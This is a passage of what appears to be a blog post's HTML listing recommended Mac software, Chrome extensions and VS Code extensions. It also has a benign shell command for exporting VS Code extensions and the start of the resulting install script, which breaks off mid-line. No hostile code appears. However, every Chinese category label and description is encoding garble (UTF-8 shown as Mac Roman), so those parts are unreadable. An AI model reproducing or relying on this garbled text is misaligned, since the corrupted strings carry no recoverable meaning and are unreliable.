style="text-align: left;">Ê±áÁéáÊç¢ÁÆó</td></tr><tr class="odd"><td style="text-align: left;">Free Download Manager</td><td style="text-align: left;">Á≥ªÁªü</td><td style="text-align: left;">‰∏ãËΩΩÂ∑•ÂÖ∑</td></tr><tr class="even"><td style="text-align: left;">F.lux</td><td style="text-align: left;">Á≥ªÁªü</td><td style="text-align: left;">Ëá™Âä®Ë∞ÉËäÇÂ±èÂπïËìùÂÖâÔºå‰øùÊä§ÁúºÁùõ</td></tr><tr class="odd"><td style="text-align: left;">LibreOffice</td><td style="text-align: left;">ÂäûÂÖ¨</td><td style="text-align: left;">Âü∫‰∫éOpenOfficeÔºåMac OS‰∏äÁöÑÂºÄÊ∫êOfficeÂÖ®ÂÆ∂Ê°∂</td></tr><tr class="even"><td style="text-align: left;">Mounty for NTFS</td><td style="text-align: left;">Á≥ªÁªü</td><td style="text-align: left;">ÊîØÊåÅÂú®Mac OSËØªÂèñNTFSÊ†ºÂºèÔºàÁßªÂä®ÔºâÁ°¨Áõò</td></tr><tr class="odd"><td style="text-align: left;">MPV</td><td style="text-align: left;">Â§öÂ™í‰Ωì</td><td style="text-align: left;">Êí≠ÊîæËΩØ‰ª∂ÈáåÁöÑMVPÔºåÂºÄÊ∫ê</td></tr><tr class="even"><td style="text-align: left;">OmniDiskSweeper</td><td style="text-align: left;">Á≥ªÁªü</td><td style="text-align: left;">MacÁ°¨Áõò‰∏çÁü•‰∏çËßâÂø´Êª°‰∫ÜÔºå‰∏ÄËà¨Ê∏ÖÁêÜËΩØ‰ª∂Ê∏ÖÁêÜÂπ∂Êó†ÊîπÂñÑÊó∂ÔºåÁî®Êù•ÊâæÂá∫Âà∞Â∫ïÊòØÂì™‰∫õÂ§ßÊñá‰ª∂(Â§π)Âç†Áî®Êù•Á°¨ÁõòÁ©∫Èó¥ÁöÑÂà©Âô®</td></tr><tr class="odd"><td style="text-align: left;">PhotoScape X</td><td style="text-align: left;">Â§öÂ™í‰Ωì</td><td style="text-align: left;">ÂÇªÁìúÂåñÁöÑÁÖßÁâáÂ§ÑÁêÜËΩØ‰ª∂</td></tr><tr class="even"><td style="text-align: left;">Super Player Lite</td><td style="text-align: left;">Â§öÂ™í‰Ωì</td><td style="text-align: left;">Êí≠ÊîæÂô®</td></tr><tr class="odd"><td style="text-align: left;">The Unarchiver</td><td style="text-align: left;">Á≥ªÁªü</td><td style="text-align: left;">Ëß£ÂéãÁº©</td></tr><tr class="even"><td style="text-align: left;">‰∏áÂπ¥ÂéÜ</td><td style="text-align: left;">Á≥ªÁªü</td><td style="text-align: left;">Êó•ÂéÜ„ÄÅÂ§©Ê∞î</td></tr></tbody></table><h1 id="‰∏ì‰∏öËΩØ‰ª∂">‰∏ì‰∏öËΩØ‰ª∂</h1><table><colgroup><col style="width: 10%" /><col style="width: 4%" /><col style="width: 84%" /></colgroup><thead><tr class="header"><th style="text-align: left;">Name</th><th style="text-align: left;">Type</th><th style="text-align: left;">Desc</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">Anki</td><td style="text-align: left;">Áîü‰∫ßÂäõ</td><td style="text-align: left;">ÂºÄÊ∫êËÆ∞ÂøÜËΩØ‰ª∂ÔºåËØ≠Ë®ÄÂ≠¶‰π†ÂèäÂêÑÈó®Â≠¶ÁßëÂ§áËÄÉÁ•ûÂô®</td></tr><tr class="even"><td style="text-align: left;">CamScanner</td><td style="text-align: left;">Â§öÂ™í‰Ωì</td><td style="text-align: left;">Âº∫Â§ßÁöÑOCRËΩØ‰ª∂</td></tr><tr class="odd"><td style="text-align: left;">FreeMind</td><td style="text-align: left;">Áîü‰∫ßÂäõ</td><td style="text-align: left;">ËÑëÂõæËΩØ‰ª∂</td></tr><tr class="even"><td style="text-align: left;">GIMP</td><td style="text-align: left;">Â§öÂ™í‰Ωì</td><td style="text-align: left;">ÂºÄÊ∫êÁâà&quot;photoshop&quot;Ôºå<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMVM0NDExTjdpNw==">ÊïôÁ®ã<i class="fa fa-external-link-alt"></i></span></td></tr><tr class="odd"><td style="text-align: left;">MarginNote Pro</td><td style="text-align: left;">Áîü‰∫ßÂäõ</td><td style="text-align: left;">ÊñáÊ°£Ê†áÊ≥®Â∑•ÂÖ∑ÔºåÁ†îËØªÂ≠¶ÊúØËÆ∫Êñá„ÄÅ‰π¶Á±çÁöÑÁ•ûÂô®ÔºåÊñπ‰æøÂú∞Âà∂‰ΩúMind MapÔºå‰ª•ÂèäÁîüÊàêAnkiÂç°ÁâáÁî®Êù•ÂèçÂ§çËÆ∞ÂøÜ„ÄÇÂèØÊÉúÁõÆÂâçÂè™ÊúâMac OSÁâàÊú¨</td></tr><tr class="even"><td style="text-align: left;">MacDown</td><td style="text-align: left;">ÊñáÂ≠ó</td><td style="text-align: left;"></td></tr><tr class="odd"><td style="text-align: left;">OverSight</td><td style="text-align: left;">ÂÆâÂÖ®</td><td style="text-align: left;">ÁõëÊéßÂΩìÂâçÂì™‰∫õÁ®ãÂ∫è‰ΩøÁî®ÊëÑÂÉèÂ§¥/È∫¶ÂÖãÈ£é</td></tr><tr class="even"><td style="text-align: left;">Simplenote</td><td style="text-align: left;">ÊñáÂ≠ó</td><td style="text-align: left;">Âü∫‰∫émarkdownÁöÑ‰∫ëËÆ∞‰∫ãÊú¨</td></tr><tr class="odd"><td style="text-align: left;">Slack</td><td style="text-align: left;">ÈÄöËÆØ</td><td style="text-align: left;"></td></tr><tr class="even"><td style="text-align: left;">TeamViewer</td><td style="text-align: left;">ÈÄöËÆØ</td><td style="text-align: left;"></td></tr><tr class="odd"><td style="text-align: left;">Telegram</td><td style="text-align: left;">ÈÄöËÆØ</td><td style="text-align: left;"></td></tr></tbody></table><h1 id="ÂºÄÂèëÁõ∏ÂÖ≥">ÂºÄÂèëÁõ∏ÂÖ≥</h1><table><thead><tr class="header"><th style="text-align: left;">Name</th><th style="text-align: left;">Type</th><th style="text-align: left;">Desc</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">Anaconda</td><td style="text-align: left;">ÂºÄÂèë</td><td style="text-align: left;">AIÁºñÁ®ãÂÖ®ÂÆ∂Ê°∂ÔºåpythonÂ§öÁâàÊú¨ÁÆ°ÁêÜÂà©Âô®</td></tr><tr class="even"><td style="text-align: left;">cd to</td><td style="text-align: left;">Á≥ªÁªü</td><td style="text-align: left;">Âú®FinderÊñá‰ª∂Â§πÁ™óÂè£ÔºåÊ∑ªÂä†ÂõæÊ†áÔºåÂèØ‰ª•‰∏ÄÈîÆÊâìÂºÄÂΩìÂâçÁõÆÂΩïÁöÑshell</td></tr><tr class="odd"><td style="text-align: left;">Dash</td><td style="text-align: left;">ÂºÄÂèë</td><td style="text-align: left;"></td></tr><tr class="even"><td style="text-align: left;">DB Browser for SQLite</td><td style="text-align: left;">Êï∞ÊçÆÂ∫ì</td><td style="text-align: left;">GUI SQLiteÂÆ¢Êà∑Á´Ø</td></tr><tr class="odd"><td style="text-align: left;">iHex</td><td style="text-align: left;">ÊñáÊú¨</td><td style="text-align: left;">16ËøõÂà∂ÁºñËæë</td></tr><tr class="even"><td style="text-align: left;">MacVim</td><td style="text-align: left;">ÊñáÊú¨</td><td style="text-align: left;">ÊñáÊú¨ÁºñËæë</td></tr><tr class="odd"><td style="text-align: left;">Pencil</td><td style="text-align: left;">ÂºÄÂèë</td><td style="text-align: left;">ÂºÄÊ∫êÁöÑUIÂéüÂûãËÆæËÆ°Â∑•ÂÖ∑</td></tr><tr class="even"><td style="text-align: left;">pgadmin</td><td style="text-align: left;">ÂºÄÂèë</td><td style="text-align: left;">Âü∫‰∫éwebÁöÑPostgreSQLÂÆ¢Êà∑Á´Ø</td></tr><tr class="odd"><td style="text-align: left;">Postman</td><td style="text-align: left;">ÂºÄÂèë</td><td style="text-align: left;">HTTPÊµãËØï</td></tr><tr class="even"><td style="text-align: left;">PxCook</td><td style="text-align: left;">ËÆæËÆ°</td><td style="text-align: left;">Ëá™Âä®Ê†áÊ≥®Â∑•ÂÖ∑</td></tr><tr class="odd"><td style="text-align: left;">Sequel Pro</td><td style="text-align: left;">Êï∞ÊçÆÂ∫ì</td><td style="text-align: left;">GUI MySQLÂÆ¢Êà∑Á´Ø</td></tr><tr class="even"><td style="text-align: left;">Termius</td><td style="text-align: left;">ÂºÄÂèë</td><td style="text-align: left;">GUI SSHÂÆ¢Êà∑Á´Ø</td></tr><tr class="odd"><td style="text-align: left;">Virtual Box</td><td style="text-align: left;">ËôöÊãüÊú∫</td><td style="text-align: left;"></td></tr><tr class="even"><td style="text-align: left;">VMware Fusion</td><td style="text-align: left;">ËôöÊãüÊú∫</td><td style="text-align: left;"></td></tr></tbody></table><h1 id="chrome-Êâ©Â±ï">Chrome Êâ©Â±ï</h1><table><colgroup><col style="width: 14%" /><col style="width: 8%" /><col style="width: 76%" /></colgroup><thead><tr class="header"><th style="text-align: left;">Name</th><th style="text-align: left;">Type</th><th style="text-align: left;">Desc</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">AdBlock</td><td style="text-align: left;">Á≥ªÁªü</td><td style="text-align: left;">ÂπøÂëäÊã¶Êà™</td></tr><tr class="even"><td style="text-align: left;">ApiDebug Http Test</td><td style="text-align: left;">ÂºÄÂèë</td><td style="text-align: left;">ChromeÊèí‰ª∂Áâà&quot;Postman&quot;</td></tr><tr class="odd"><td style="text-align: left;">Better History</td><td style="text-align: left;">Á≥ªÁªü</td><td style="text-align: left;">ChromeÁöÑÂéÜÂè≤Â¢ûÂº∫Êèí‰ª∂ÔºåÊúâÂº∫Â§ßÁöÑÊ£ÄÁ¥¢ËßÑÂàô</td></tr><tr class="even"><td style="text-align: left;">Black Menu for Google</td><td style="text-align: left;">Á≥ªÁªü</td><td style="text-align: left;">GoogleÂÖ®ÂÆ∂Ê°∂ÁöÑÂø´Êç∑ÊñπÂºè</td></tr><tr class="odd"><td style="text-align: left;">Bookmark Sidebar</td><td style="text-align: left;">Á≥ªÁªü</td><td style="text-align: left;">Âº∫Â§ßÁöÑÊî∂ËóèÂ§πÁÆ°ÁêÜÊèí‰ª∂ÔºåÂü∫‰∫éÈªòËÆ§ÁöÑÊî∂ËóèÂ§πÔºåÂäüËÉΩÊØîÈªòËÆ§ÁöÑ‰∏çÁü•ÈÅìÈ´òÂà∞ÔΩû</td></tr><tr class="even"><td style="text-align: left;">ChroPath</td><td style="text-align: left;">ÂºÄÂèë</td><td style="text-align: left;">Âø´ÈÄüÁ°ÆÂÆöÂÖÉÁ¥†ÁöÑxpathÔºåÊîØÊåÅiframe</td></tr><tr class="odd"><td style="text-align: left;">ColorZilla</td><td style="text-align: left;">ÂºÄÂèë</td><td style="text-align: left;">Ëé∑ÂèñRGBÂÄº</td></tr><tr class="even"><td style="text-align: left;">Dark Reader</td><td style="text-align: left;">ÂÅ•Â∫∑</td><td style="text-align: left;">ÁΩëÈ°µËÉåÊôØËâ≤ÂèòÈªëÔºå‰øùÊä§ÁúºÁùõÔºàtabÂ§öÊó∂‰ºöÂΩ±ÂìçÈ°µÈù¢ÊÄßËÉΩÔºåÂõ†‰∏∫ÈªòËÆ§Â•ΩÂÉèÊòØÈÄÇÁî®ÊâÄÊúâtabÔºüÔºâ</td></tr><tr class="odd"><td style="text-align: left;">EditThisCookie</td><td style="text-align: left;">ÂºÄÂèë</td><td style="text-align: left;">Âº∫Â§ßÁöÑCookieÁºñËæëÁÆ°ÁêÜÊèí‰ª∂</td></tr><tr class="even"><td style="text-align: left;">Fatkun Batch Download Image</td><td style="text-align: left;">Â§öÂ™í‰Ωì</td><td style="text-align: left;">Âº∫Â§ßÁöÑÈ°µÈù¢ÂõæÁâáÊâπÈáè‰∏ãËΩΩÊèí‰ª∂</td></tr><tr class="odd"><td style="text-align: left;">Free Download Manager</td><td style="text-align: left;">Á≥ªÁªü</td><td style="text-align: left;">Á≥ªÁªüÁöÑFree Download ManagerÂî§ÈÜíÁî®</td></tr><tr class="even"><td style="text-align: left;">Google Docs Offline</td><td style="text-align: left;">ÂäûÂÖ¨</td><td style="text-align: left;">Á¶ªÁ∫øÁºñËæëGoogle OfficeÊñáÊ°£</td></tr><tr class="odd"><td style="text-align: left;">Grammarly for Chrome</td><td style="text-align: left;">Áîü‰∫ßÂäõ</td><td style="text-align: left;">ÂØπËæìÂÖ•Ëã±ÊñáËøõË°åËØ≠Ê≥ïÊãºÂÜôÊ£ÄÊü•</td></tr><tr class="even"><td style="text-align: left;">Honey</td><td style="text-align: left;">Ë¥≠Áâ©</td><td style="text-align: left;">Ê¨ßÁæéÂêÑÂ§ßÁîµÂïÜÁΩëÁ´ôÔºåÂú®‰∏ãÂçïÈ°µÈù¢Ëá™Âä®Â°´ÂÖ•ÂèØÁî®ÁöÑ‰ºòÊÉ†Âà∏ÊâìÊäòÁ†Å</td></tr><tr class="odd"><td style="text-align: left;">Japanese IO</td><td style="text-align: left;">Áîü‰∫ßÂäõ</td><td style="text-align: left;">ÁΩëÈ°µÊó•ËØ≠ÂçïËØçÂàíËØçÊü•ËØ¢ÔºåÂä†ÂÖ•Japanese IOÁîüËØçÊú¨Ôºå‰πãÂêéÂú®ÂÖ∂ÁΩëÁ´ôÂèØ‰ª•ËøõË°åÂ§ç‰π†</td></tr><tr class="even"><td style="text-align: left;">JSON-handle</td><td style="text-align: left;">ÂºÄÂèë</td><td style="text-align: left;">Ê†ºÂºèÂåñÈ°µÈù¢ÁöÑjsonÊñáÊú¨</td></tr><tr class="odd"><td style="text-align: left;">Kami Extension</td><td style="text-align: left;">Áîü‰∫ßÂäõ</td><td style="text-align: left;">Âº∫Â§ßÁöÑÊñáÊ°£Ê†áÊ≥®Â∑•ÂÖ∑ÔºåÁ±ª‰ºº‰∫éMarginNote ProÔºå‰ΩÜÊ≤°ÊúâËÑëÂõæ„ÄÅÂà∂Âç°ÂäüËÉΩ</td></tr><tr class="even"><td style="text-align: left;">Lighthouse</td><td style="text-align: left;">ÂºÄÂèë</td><td style="text-align: left;">ÂØπÁ´ôÁÇπÂêÑÁßçÊÄßËÉΩÊåáÊ†áËøõË°åËØÑ‰º∞Ôºå‰ª•ÁªôÁΩëÁ´ôÁÆ°ÁêÜ‰∫∫ÂëòÊèê‰æõÂØπËøõË°åÁΩëÁ´ô‰ºòÂåñÁöÑÊï∞ÊçÆ‰æùÊçÆ</td></tr><tr class="odd"><td style="text-align: left;">Live editor for CSS, Less &amp; Sass</td><td style="text-align: left;">ÂºÄÂèë</td><td style="text-align: left;">‰ΩøÁî®È°µÈù¢ÁºñËæëÂô®ÂÆûÊó∂È¢ÑËßàCSS/Less/Sass‰ª£Á†Å„ÄÇËá™Âä®ÂÆåÊàêÔºåÊõ¥Â∞ëÁöÑ/SassÂà∞CSSÔºåÁæéÂåñÔºåÁº©Â∞èÔºåCSSÈáçÊñ∞Âä†ËΩΩÔºålint„ÄÇ„ÄÇ„ÄÇ</td></tr><tr class="even"><td style="text-align: left;">Momentum</td><td style="text-align: left;">Á≥ªÁªü</td><td style="text-align: left;">ËÆ©chromeÊñ∞Ê†áÁ≠æÈ°µÊã•ÊúâÁæéÂõæ„ÄÅÊó∂Èó¥„ÄÅÂ§©Ê∞î„ÄÅTODOÁ≠âÂ§öÂäüËÉΩ</td></tr><tr class="odd"><td style="text-align: left;">Nimbus Screenshot &amp; Screen Video Recorder</td><td style="text-align: left;">Â§öÂ™í‰Ωì</td><td style="text-align: left;">Âº∫Â§ßÁöÑÁΩëÈ°µÊà™ÂõæÔºåÊîØÊåÅÂÖ®ÁΩëÈ°µ„ÄÅÊªöÂä®Á≠âÂêÑÁßçÊà™ÂõæÊ®°ÂºèÔºå‰πüÊîØÊåÅÂΩïÂà∂ËßÜÈ¢ë</td></tr><tr class="even"><td style="text-align: left;">NooBoss</td><td style="text-align: left;">Á≥ªÁªü</td><td style="text-align: left;">Âº∫Â§ßÁöÑchromeÊèí‰ª∂ÁÆ°ÁêÜÂ∑•ÂÖ∑ÔºåÊØîÈªòËÆ§ÁöÑ‰∏çÁü•ÈÅìÈ´òÂà∞ÔΩû</td></tr><tr class="odd"><td style="text-align: left;">Octotree</td><td style="text-align: left;">ÂºÄÂèë</td><td style="text-align: left;">‰∏∫github‰ªìÂ∫ìÂ¢ûÂä†‰∏ìÂ±ûÁöÑ‰æßËæπÊ†èÔºå‰ª•Êñá‰ª∂Ê†ëÁöÑÊ®°ÂºèÊü•Áúã‰ªìÂ∫ìÁöÑÊñá‰ª∂„ÄÇÂêåÊó∂ÊîØÊåÅgithubÁöÑÂ§úÈó¥Ê®°Âºè</td></tr><tr class="even"><td style="text-align: left;">One-click Image Reader (OCR)</td><td style="text-align: left;">Â§öÂ™í‰Ωì</td><td style="text-align: left;">Êà™Âõæ+OCR</td></tr><tr class="odd"><td style="text-align: left;">Online Dictionary Helper</td><td style="text-align: left;">Áîü‰∫ßÂäõ</td><td style="text-align: left;">Âº∫Â§ßÁöÑÂàíËØçËØçÂÖ∏Ê°ÜÊû∂ÔºåÂõΩ‰∫∫ÁöÑ‰ΩúÂìÅ„ÄÇÊîØÊåÅmdxËØçÂÖ∏„ÄÅËá™Âà∂ËØçÂÖ∏ÔºåÂÜÖÁΩÆÂ§öÁßçËã±ÊñáËØçÂÖ∏ÂèäÊ≥ï„ÄÅÂæ∑„ÄÅ‰øÑËØ≠Á≠âÂ§öÁßçËØçÂÖ∏ÔºåÂπ∂‰∏îÊîØÊåÅ‰∏ÄÈîÆÂà∂ÂÅöAnkiÂç°ÁâáÔºàÈÄöËøáAnkiÁöÑAnkiConnectÊèí‰ª∂ÔºâÔºå‰ª•‰æõÊó•ÂêéÂèçÂ§çÂ§ç‰π†</td></tr><tr class="even"><td style="text-align: left;">Page Ruler Redux</td><td style="text-align: left;">ÂºÄÂèë</td><td style="text-align: left;">ÊµãÈáèÁΩëÈ°µÂÖÉÁ¥†ÁöÑÂÉèÁ¥†Êï∞</td></tr><tr class="odd"><td style="text-align: left;">Proxy SwitchyOmega</td><td style="text-align: left;">Á≥ªÁªü</td><td style="text-align: left;">Âº∫Â§ßÁöÑHTTP/SOCKS‰ª£ÁêÜÂ∑•ÂÖ∑ÔºåÊîØÊåÅÈ°µÈù¢Âø´ÈÄüÂàáÊç¢„ÄÇÊØîÈªòËÆ§ÁöÑ‰∏çÁü•ÈÅìÈ´òÂà∞ÔΩû</td></tr><tr class="even"><td style="text-align: left;">Quick Javascript Switcher</td><td style="text-align: left;">Á≥ªÁªü</br>ÂºÄÂèë</td><td style="text-align: left;">Âø´ÈÄüÂàáÊç¢È°µÈù¢ÁöÑJSÁ¶ÅÁî®/ÂêØÁî®</td></tr><tr class="odd"><td style="text-align: left;">Screencastify</td><td style="text-align: left;">Â§öÂ™í‰Ωì</td><td style="text-align: left;">Âº∫Â§ßÁöÑÂΩïÂ±èÊèí‰ª∂</td></tr><tr class="even"><td style="text-align: left;">Session Buddy</td><td style="text-align: left;">Á≥ªÁªü</td><td style="text-align: left;">ÂêåÊó∂ÊâìÂºÄÈùûÂ∏∏Â§öTabÊó∂ÔºåÂèØ‰ª•Áî®ÂÆÉÂàÜÁ±ªÂàÜÁªÑÁÆ°ÁêÜËøô‰∫õtagÔºåÊöÇÊó∂‰∏çÁî®ÁöÑÁªÑÂèØ‰ª•ÊîæÂøÉÂÖ≥Èó≠Ôºå‰πãÂêéÂèØ‰ª•‰∏ÄÈîÆÈáçÂºÄ</td></tr><tr class="odd"><td style="text-align: left;">Set Character Encoding</td><td style="text-align: left;">Á≥ªÁªü</td><td style="text-align: left;">ÁΩëÈ°µÁºñÁ†ÅËÆæÁΩÆ/ÂàáÊç¢Â∑•ÂÖ∑ÔºåÊØîÈªòËÆ§ÁöÑÊñπ‰æøÂæàÂ§öüëì</td></tr><tr class="even"><td style="text-align: left;">Strict Workflow</td><td style="text-align: left;">Áîü‰∫ßÂäõ</br>ÂÅ•Â∫∑</td><td style="text-align: left;">Áï™ËåÑÈíüÔºåÂ∏¶ÊúâÂ∑•‰ΩúÂë®ÊúüÂÜÖÁâπÂÆöÁΩëÁ´ôÂ±èËîΩÂäüËÉΩÔºå‰ª•Èò≤Ê≠¢‰∏çËá™Âà∂Âú∞Ëµ∞Á•û</td></tr><tr class="odd"><td style="text-align: left;">Talend API Tester - Free Edition</td><td style="text-align: left;">ÂºÄÂèë</td><td style="text-align: left;">Postman ÁΩëÈ°µÁâà 2</td></tr><tr class="even"><td style="text-align: left;">Tampermonkey</td><td style="text-align: left;">Á≥ªÁªü</br>Áîü‰∫ßÂäõ</br>ÂºÄÂèë</td><td style="text-align: left;">Âº∫Â§ßÁöÑËÑöÊú¨Ê°ÜÊû∂ÂíåÂ∏ÇÂú∫ÔºåÂèØ‰ª•ÁêÜËß£‰∏∫Âú®chromeÊèí‰ª∂ÈáåÂ≠òÂú®ÁöÑÊèí‰ª∂Â∏ÇÂú∫ÔºåÊàëÂ∏∏Áî®ÁöÑËÑöÊú¨ÊúâÔºö</br>¬∑HTML5Êí≠ÊîæÂô®Â¢ûÂº∫Êèí‰ª∂</br>¬∑ÁôæÂ∫¶‰∫ëÊèí‰ª∂+APIKey</br>¬∑ÁôæÂ∫¶ÁΩëÁõòÁõ¥Èìæ‰∏ãËΩΩÂä©Êâã</br>¬∑Ëß£Èô§BÁ´ôÂå∫ÂüüÈôêÂà∂</td></tr><tr class="odd"><td style="text-align: left;">The Great Suspender</td><td style="text-align: left;">Á≥ªÁªü</td><td style="text-align: left;">‰∏≠‰ΩéÊÄßËÉΩÁîµËÑëÁöÑÁ¶èÈü≥„ÄÇÂΩìÂêåÊó∂ÊâìÂºÄÂ§ßÈáètabÊó∂ÔºåCPUÂíåÂÜÖÂ≠ò‰ΩøÁî®ÈáèÂæàÈ´òÔºåËÄåÈÄöÂ∏∏Âú®‰ΩøÁî®‰∏≠ÁöÑtabÂè™ÊòØÂÖ∂‰∏≠ÁöÑ‰∏Ä‰∏™ÊàñÂá†‰∏™„ÄÇËØ•Êèí‰ª∂ÂèØ‰ª•Â∞Ü‰∏ÄÊÆµÊó∂Èó¥Ê≤°ÊúâË¢´‰ΩøÁî®Âà∞ÁöÑtabÂÅúÊ≠¢Ôºà‰ΩÜ‰∏çÂÖ≥Èó≠Ôºâ‰ª•ÈáäÊîæÁ≥ªÁªüËµÑÊ∫êÔºåÈúÄË¶ÅÁî®Âà∞ÁöÑÊó∂ÂÄôÂÜçÂçïÂáªÈáçÊñ∞Âä†ËΩΩÂç≥ÂèØ</td></tr><tr class="even"><td style="text-align: left;">Turn Off the Lights</td><td style="text-align: left;">ÂÅ•Â∫∑</td><td style="text-align: left;">ÁΩëÈ°µÂä†ÁÅ∞Ëâ≤Êª§ÈïúÔºå‰øùÊä§ÁúºÁùõ</td></tr><tr class="odd"><td style="text-align: left;">User-Agent Switcher for Chrome</td><td style="text-align: left;">ÂºÄÂèë</td><td style="text-align: left;">Âº∫Â§ßÁöÑUser AgentÂàáÊç¢Â∑•ÂÖ∑</td></tr><tr class="even"><td style="text-align: left;">Video Speed Controller</td><td style="text-align: left;">Â§öÂ™í‰Ωì</td><td style="text-align: left;">h5ËßÜÈ¢ëÂä†ÂáèÈÄüÊí≠Êîæ(Êúâ‰∫õËßÜÈ¢ëÈªòËÆ§Ê≤°ÊúâÊèê‰æõËØ•ÈÄâÈ°π)Ôºå‰ª•ÂèäÂø´ËøõÂíåÂêéÈÄÄ</td></tr><tr class="odd"><td style="text-align: left;">Wappalyzer</td><td style="text-align: left;">ÂºÄÂèë</td><td style="text-align: left;">ÂàÜÊûêÂΩìÂâçÁΩëÈ°µ(Á´ô)ÊâÄ‰ΩøÁî®ÁöÑÊäÄÊúØÊ†à</td></tr><tr class="even"><td style="text-align: left;">Web Developer</td><td style="text-align: left;">ÂºÄÂèë</td><td style="text-align: left;">‰∏∫webÂºÄÂèë‰∫∫ÂëòÂÆûÁî®Â∑•ÂÖ∑ÈõÜ</td></tr><tr class="odd"><td style="text-align: left;">Window Resizer</td><td style="text-align: left;">ÂºÄÂèë</td><td style="text-align: left;">ÊµèËßàÂô®Á™óÂè£Â§ßÂ∞èËÆæÁΩÆÂ∑•ÂÖ∑</td></tr><tr class="even"><td style="text-align: left;">Yomichan</td><td style="text-align: left;">Áîü‰∫ßÂäõ</td><td style="text-align: left;">Êó•ËØ≠ÁâàÁöÑOnline Dictionary HelperÔºåÂØπÈ°µÈù¢Êó•ËØ≠ÂàíËØçÂæóÂà∞Êü•ËØ¢ÂçïËØçÁöÑËã±ËØ≠Ëß£ÈáäÂíåÈü≥È¢ëÂèëÈü≥ÔºåÂêåÊ†∑ÊîØÊåÅËá™Âà∂ËØçÂÖ∏„ÄÇÂÖ∂‰ΩúËÄÖ‰πüÊòØAnkiConnectÁöÑ‰ΩúËÄÖÔºåÁ¨¨‰∏Ä‰ΩçÂÆûÁé∞ÁΩëÈ°µÂàíËØçÊü•ËØ¢Âπ∂‰∏éAnkiËÅîÂä®‰∏ÄÈîÆÂà∂Âç°ÁöÑÂ§ßÁ•û„ÄÇÂÖ∂ÂÆûODH‰ΩúËÄÖ‰πüÊòØÂèÇËÄÉ‰∫ÜËØ•Êèí‰ª∂Âà∂‰ΩúÁöÑODH</td></tr><tr class="odd"><td style="text-align: left;">ÂîßÂîßChromeÊâ©Â±ïÁ®ãÂ∫è</td><td style="text-align: left;">Â§öÂ™í‰Ωì</td><td style="text-align: left;">ËøôÊòØ‰∏Ä‰∏™Âü∫‰∫éwebÔºåÁî®‰∫é‰∏ãËΩΩbilibiliËßÜÈ¢ëÁöÑÂú®Á∫øÂ∫îÁî®Á®ãÂ∫èÔºåÂÆÉËÉΩÂ§ü‰∏ãËΩΩ99%bilibiliÂÆòÊñπËßÜÈ¢ë(Â•áËâ∫)ÔºåÂπ∂‰∏îÂÆÉÂ∞Ü‰ºöÁªàË∫´ÂÖçË¥πÊèê‰æõ‰ΩøÁî®ÔºåÂè¶Â§ñÔºåÁé∞Âú®ÂÆÉÂ∑≤ÁªèÊîØÊåÅÂºπÂπï‰∏ãËΩΩ!</td></tr><tr class="even"><td style="text-align: left;">Áå´Êäì</td><td style="text-align: left;">Â§öÂ™í‰Ωì</td><td style="text-align: left;">ÁΩëÈ°µÂ§öÂ™í‰ΩìËµÑÊ∫êURLÂóÖÊé¢Â∑•ÂÖ∑</td></tr></tbody></table><h1 id="visual-studio-code-Êèí‰ª∂">Visual Studio Code Êèí‰ª∂</h1><h2 id="Êèí‰ª∂ÂàóË°®ÂØºÂá∫">Êèí‰ª∂ÂàóË°®ÂØºÂá∫</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code --list-extensions | sed -e <span class="string">'s/^/code --install-extension /'</span> &gt; my_vscode_extensions.sh</span><br></pre></td></tr></table></figure><h2 id="ÊàëÁöÑÊèí‰ª∂ÂàóË°®">ÊàëÁöÑÊèí‰ª∂ÂàóË°®</h2><p><code>my_vscode_extensions.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">code --install-extension IBM.output-colorizer</span><br><span class="line">code --install-extension alefragnani.project-manager</span><br><span class="line">code --install-extension Angular.ng-template</span><br><span class="line">code --install-extension bajdzis.vscode-database</span><br><span class="line">code --install-extension christian-kohler.npm-intellisense</span><br><span class="line">code --install-extension christian-kohler.path-intellisense</span><br><span class="line">code --install-extension clinyong.vscode-css-modules</span><br><span class="line">code --install-extension cyrilletuzi.angular-schematics</span><br><span class="line">code --install-extension dakara.transformer</span><br><span class="line">code --install-extension DavidAnson.vscode-markdownlint</span><br><span class="line">code --install-extension dbaeumer.jshint</span><br><span class="line">code --install-extension dbaeumer.vscode-eslint</span><br><span class="line">code --install-extension donjayamanne.githistory</span><br><span class="line">code --install-extension donjayamanne.jquerysnippets</span><br><span class="line">code --install-extension EditorConfig.EditorConfig</span><br><span class="line">code --install-extension eg2.vscode-npm-script</span><br><span class="line">code --install-extension esbenp.prettier-vscode</span><br><span class="line">code --install-extension fantasy.vscode-hexo-utils</span><br><span class="line">code --install-extension geyao.html-snippets</span><br><span class="line">code --install-extension GrapeCity.gc-excelviewer</span><br><span class="line">code --install-extension HookyQR.beautify</span><br><span class="line">code --install-extension jasonnutter.search-node-modules</span><br><span class="line">code --install-extension JeffersonQin.hexo-next-snippets</span><br><span class="line">code --install-extension 